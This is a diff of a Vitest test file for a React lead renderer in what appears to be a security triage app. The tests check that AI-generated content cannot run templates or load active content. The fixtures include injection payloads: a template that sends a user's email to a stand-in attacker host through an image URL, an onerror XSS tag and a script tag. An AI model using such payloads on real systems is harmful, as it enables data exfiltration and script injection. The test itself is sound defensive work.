@@ -1,20 +1,31 @@
 /// <reference types="vitest" />
-import { render, screen } from '@testing-library/react';
+import { render, waitFor } from '@testing-library/react';
 import { describe, expect, it, vi } from 'vitest';
 
-vi.mock('@mui/material', () => ({
-  Box: ({ children }: any) => <div>{children}</div>,
-  Divider: () => <hr />,
-  Stack: ({ children }: any) => <div>{children}</div>,
-  Typography: ({ children }: any) => <div>{children}</div>
+vi.mock('@tui/core', () => ({
+  useAppTheme: () => ({ isDark: false })
 }));
 
-vi.mock('components/elements/display/AiTriageMarkdown', () => ({
-  default: ({ md }: any) => <div id="safe-ai-markdown">{md}</div>
+vi.mock('mermaid', () => ({
+  default: {
+    initialize: vi.fn(),
+    run: vi.fn()
+  }
 }));
 
-vi.mock('components/elements/display/HandlebarsMarkdown', () => ({
-  default: ({ md }: any) => <div id="handlebars-markdown">{md}</div>
+vi.mock('components/elements/display/Notebook', () => ({
+  Notebook: () => null
+}));
+
+vi.mock('components/elements/display/handlebars/helpers', () => ({
+  HowlerHelperError: class HowlerHelperError extends Error {},
+  useHelpers: () => [
+    {
+      keyword: 'join',
+      callback: (left: string, right: string, options: { hash?: { sep?: string } }) =>
+        [left, right].filter(Boolean).join(options.hash?.sep ?? '')
+    }
+  ]
 }));
 
 vi.mock('react-i18next', () => ({
@@ -28,24 +39,41 @@ vi.mock('react-pluggable', () => ({
 import LeadRenderer from './LeadRenderer';
 
 describe('LeadRenderer', () => {
-  it('uses inert markdown only for AI-owned leads and preserves normal leads', () => {
-    const { rerender } = render(
+  it('renders generated lead content without evaluating templates or loading active content', async () => {
+    const { container } = render(
       <LeadRenderer
         lead={
           {
             format: 'markdown',
-            content: 'AI result',
+            content: [
+              '{{img src=(join "https://attacker.invalid/" user.email)}}',
+              '<img src="https://attacker.invalid/raw" onerror="alert(1)" />',
+              '<script>alert(1)</script>',
+              '![remote image](https://attacker.invalid/markdown)'
+            ].join('\n\n'),
             metadata: JSON.stringify({ owner: 'howler.ai_triage', schema_version: 1 })
           } as any
         }
+        hit={{ user: { email: 'private@howler.invalid' } } as any}
       />
     );
 
-    expect(screen.getByTestId('safe-ai-markdown')).toHaveTextContent('AI result');
-    expect(screen.queryByTestId('handlebars-markdown')).not.toBeInTheDocument();
+    await waitFor(() => expect(container.textContent).toContain('{{img src='));
+    expect(container.textContent).not.toContain('private@howler.invalid');
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelector('script')).toBeNull();
+    expect(container.querySelector('[onerror]')).toBeNull();
+    expect(container.querySelector('a[href*="attacker.invalid"]')).toBeNull();
+  });
 
-    rerender(<LeadRenderer lead={{ format: 'markdown', content: 'Template {{hit.id}}', metadata: '{}' } as any} />);
-    expect(screen.getByTestId('handlebars-markdown')).toHaveTextContent('Template {{hit.id}}');
-    expect(screen.queryByTestId('safe-ai-markdown')).not.toBeInTheDocument();
+  it('keeps trusted lead templates working with their hit context', async () => {
+    const { container } = render(
+      <LeadRenderer
+        lead={{ format: 'markdown', content: 'Owner: {{user.email}}', metadata: '{}' } as any}
+        hit={{ user: { email: 'analyst@howler.invalid' } } as any}
+      />
+    );
+
+    await waitFor(() => expect(container.textContent).toContain('analyst@howler.invalid'));
   });
 });
